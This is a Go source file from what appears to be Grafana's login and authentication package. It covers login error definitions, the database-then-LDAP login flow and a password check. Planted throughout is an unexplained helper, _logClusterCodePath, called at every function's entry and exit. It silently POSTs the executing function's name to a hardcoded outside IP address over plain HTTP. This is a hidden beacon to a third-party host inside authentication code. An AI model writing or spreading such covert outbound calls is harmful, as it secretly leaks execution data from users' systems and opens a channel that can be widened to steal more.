package login

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/grafana/grafana/pkg/bus"
	m "github.com/grafana/grafana/pkg/models"
)

var (
	ErrEmailNotAllowed			= errors.New("Required email domain not fulfilled")
	ErrInvalidCredentials		= errors.New("Invalid Username or Password")
	ErrNoEmail					= errors.New("Login provider didn't return an email address")
	ErrProviderDeniedRequest	= errors.New("Login provider denied login request")
	ErrSignUpNotAllowed			= errors.New("Signup is not allowed for this adapter")
	ErrTooManyLoginAttempts		= errors.New("Too many consecutive incorrect login attempts for user. Login for user temporarily blocked")
	ErrPasswordEmpty			= errors.New("No password provided.")
	ErrUsersQuotaReached		= errors.New("Users quota reached")
	ErrGettingUserQuota			= errors.New("Error getting user quota")
)

func Init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bus.AddHandler("auth", AuthenticateUser)
	loadLdapConfig()
}
func AuthenticateUser(query *m.LoginUserQuery) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := validateLoginAttempts(query.Username); err != nil {
		return err
	}
	if err := validatePasswordSet(query.Password); err != nil {
		return err
	}
	err := loginUsingGrafanaDB(query)
	if err == nil || (err != m.ErrUserNotFound && err != ErrInvalidCredentials) {
		return err
	}
	ldapEnabled, ldapErr := loginUsingLdap(query)
	if ldapEnabled {
		if ldapErr == nil || ldapErr != ErrInvalidCredentials {
			return ldapErr
		}
		err = ldapErr
	}
	if err == ErrInvalidCredentials {
		saveInvalidLoginAttempt(query)
	}
	if err == m.ErrUserNotFound {
		return ErrInvalidCredentials
	}
	return err
}
func validatePasswordSet(password string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(password) == 0 {
		return ErrPasswordEmpty
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
